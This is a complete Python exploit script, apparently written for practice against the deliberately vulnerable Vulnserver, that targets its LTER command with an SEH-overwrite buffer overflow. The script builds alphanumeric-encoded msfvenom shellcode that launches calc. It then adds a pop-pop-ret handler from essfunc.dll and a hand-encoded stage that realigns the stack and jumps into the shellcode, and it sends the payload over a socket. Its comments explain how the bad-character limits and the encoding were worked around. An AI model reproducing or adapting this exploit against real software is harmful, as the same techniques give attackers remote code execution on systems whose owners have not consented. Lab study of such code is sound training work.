#by far the most vulnserv exploit yet

import socket

server = '192.168.228.4'  # The server's hostname or IP address
port = 9999               # The port used by the server

#via looking through badchars we can only use alpha numeric 0x01-0x7f
#msfvenom -p windows/exec CMD=calc -e x86/alpha_mixed BufferRegister=ESP -f py
buf =  ""
buf += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x79\x6c\x38\x68\x6b\x32\x57\x70\x63\x30\x55\x50\x33"
buf += "\x50\x4d\x59\x4b\x55\x35\x61\x49\x50\x33\x54\x4c\x4b"
buf += "\x62\x70\x36\x50\x4c\x4b\x31\x42\x66\x6c\x4c\x4b\x52"
buf += "\x72\x42\x34\x4e\x6b\x63\x42\x77\x58\x76\x6f\x4d\x67"
buf += "\x62\x6a\x55\x76\x70\x31\x69\x6f\x4e\x4c\x55\x6c\x73"
buf += "\x51\x63\x4c\x33\x32\x74\x6c\x31\x30\x4b\x71\x6a\x6f"
buf += "\x64\x4d\x65\x51\x6a\x67\x59\x72\x5a\x52\x53\x62\x33"
buf += "\x67\x6c\x4b\x31\x42\x42\x30\x4c\x4b\x70\x4a\x67\x4c"
buf += "\x6e\x6b\x62\x6c\x52\x31\x71\x68\x6a\x43\x63\x78\x66"
buf += "\x61\x68\x51\x30\x51\x6e\x6b\x70\x59\x37\x50\x33\x31"
buf += "\x7a\x73\x4e\x6b\x30\x49\x32\x38\x79\x73\x65\x6a\x33"
buf += "\x79\x6c\x4b\x46\x54\x4e\x6b\x53\x31\x6b\x66\x54\x71"
buf += "\x4b\x4f\x6c\x6c\x6f\x31\x38\x4f\x34\x4d\x65\x51\x69"
buf += "\x57\x34\x78\x49\x70\x33\x45\x4b\x46\x73\x33\x63\x4d"
buf += "\x4a\x58\x75\x6b\x31\x6d\x47\x54\x30\x75\x69\x74\x30"
buf += "\x58\x6c\x4b\x52\x78\x45\x74\x35\x51\x7a\x73\x32\x46"
buf += "\x4e\x6b\x66\x6c\x72\x6b\x4c\x4b\x76\x38\x47\x6c\x33"
buf += "\x31\x6e\x33\x4c\x4b\x35\x54\x4c\x4b\x73\x31\x7a\x70"
buf += "\x4b\x39\x77\x34\x75\x74\x47\x54\x71\x4b\x73\x6b\x73"
buf += "\x51\x42\x79\x73\x6a\x33\x61\x49\x6f\x6b\x50\x73\x6f"
buf += "\x73\x6f\x33\x6a\x4e\x6b\x32\x32\x5a\x4b\x6c\x4d\x63"
buf += "\x6d\x73\x5a\x33\x31\x4e\x6d\x6c\x45\x6f\x42\x55\x50"
buf += "\x57\x70\x35\x50\x46\x30\x75\x38\x56\x51\x6c\x4b\x72"
buf += "\x4f\x6e\x67\x79\x6f\x79\x45\x4f\x4b\x6a\x50\x4d\x65"
buf += "\x6d\x72\x36\x36\x32\x48\x4d\x76\x4f\x65\x4f\x4d\x6d"
buf += "\x4d\x6b\x4f\x59\x45\x67\x4c\x63\x36\x63\x4c\x35\x5a"
buf += "\x6b\x30\x49\x6b\x4d\x30\x74\x35\x74\x45\x4f\x4b\x43"
buf += "\x77\x45\x43\x43\x42\x32\x4f\x62\x4a\x43\x30\x51\x43"
buf += "\x69\x6f\x69\x45\x72\x43\x53\x51\x70\x6c\x55\x33\x75"
buf += "\x50\x41\x41"

shellcode = buf

command = 'LTER /.../'

junk = command + 1998 * '\x41' + shellcode

#jno jo one must be true
#from looking at badchars 0xff is converted to 0x80 which gives us a negative 128 jump
nseh = '\x71\xff\x70\xff'
#0x6250120B pop ecx pop ecx ret essfunc.dll sits in alphanumeric range
handler = '\x0b\x12\x50\x62'

#our shellcode is on stack above us (lower address)
#first move esp within or reverse jump range (0x80)
#then write alphanumeric encoded jumpcode on stack which will 
#align esp to our shell code and jmp esp
#then reverse jump to this jumpcode
encoded_stage  = '' # set eax to manipulate stack
encoded_stage += '\x54' #push esp
encoded_stage += '\x58' #pop eax
encoded_stage += '\x05\x01\x12\x01\x01' #add eax, 0x01011201
encoded_stage += '\x2d\x01\x01\x01\x01' #sub eax, 0x01010101
encoded_stage += '\x50' #push eax
encoded_stage += '\x5c' #pop esp
#alphanumeric zero eax
encoded_stage += '\x25\x01\x01\x01\x01'   # and eax,0x01010101 and then opposite to zero
encoded_stage += '\x25\x10\x10\x10\x10'   # and eax,0x10101010
#set esp back to somewhere near the shellcode sub 0x56C to esp 
#shellcode alphanumeric: push esp, pop eax, sub ax, 0x540, push eax, pop esp, jmp esp
# as order opcodes \x54\x58\x66\x2d
#                  \x40\x05\x50\x5c
#                  \xff\xe4\x90\x90
#
#as on stack       \x90\x90\xe4\xff 
#                  \x5c\x50\x05\x40
#                  \x2d\x66\x58\x54
#write \x90\x90\xe4\xff
encoded_stage += '\x05\x77\x70\x70\x70'  #add eax, 0x70707077
encoded_stage += '\x05\x77\x72\x10\x10'  #add eax, 0x70107277
encoded_stage += '\x05\x11\x02\x10\x10'  #add eax, 0x10100211
encoded_stage += '\x50' #push eax
#alphanumeric zero eax
encoded_stage += '\x25\x01\x01\x01\x01'   # and eax,0x01010101 and then opposite to zero
encoded_stage += '\x25\x10\x10\x10\x10'   # and eax,0x10101010
#write \x5c\x50\x05\x40
encoded_stage += '\x05\x20\x03\x30\x35'  #add eax, 0x35300320
encoded_stage += '\x05\x10\x01\x10\x15'  #add eax, 0x15100110
encoded_stage += '\x05\x10\x01\x10\x12'  #add eax, 0x12100110
encoded_stage += '\x50' #push eax
#alphanumeric zero eax
encoded_stage += '\x25\x01\x01\x01\x01'   # and eax,0x01010101 and then opposite to zero
encoded_stage += '\x25\x10\x10\x10\x10'   # and eax,0x10101010
#write \x2d\x66\x58\x54
encoded_stage += '\x05\x43\x47\x55\x17'  #add eax, 0x17554743
encoded_stage += '\x05\x11\x11\x11\x16'  #add eax, 0x16111111
encoded_stage += '\x50' #push eax
#now jump to shellcode pushed onto stack
encoded_stage += '\x71\xff\x70\xff'      #jno -128 jo -128 0xff changed to 0x80 during runtime

payload = junk + '\x41' * (3378 - len(junk)) + encoded_stage 
payload += '\x42' * (3504 - len(payload)) + nseh + handler 

exploit = payload + (5000 - len(payload)) * '\x43'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(exploit)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
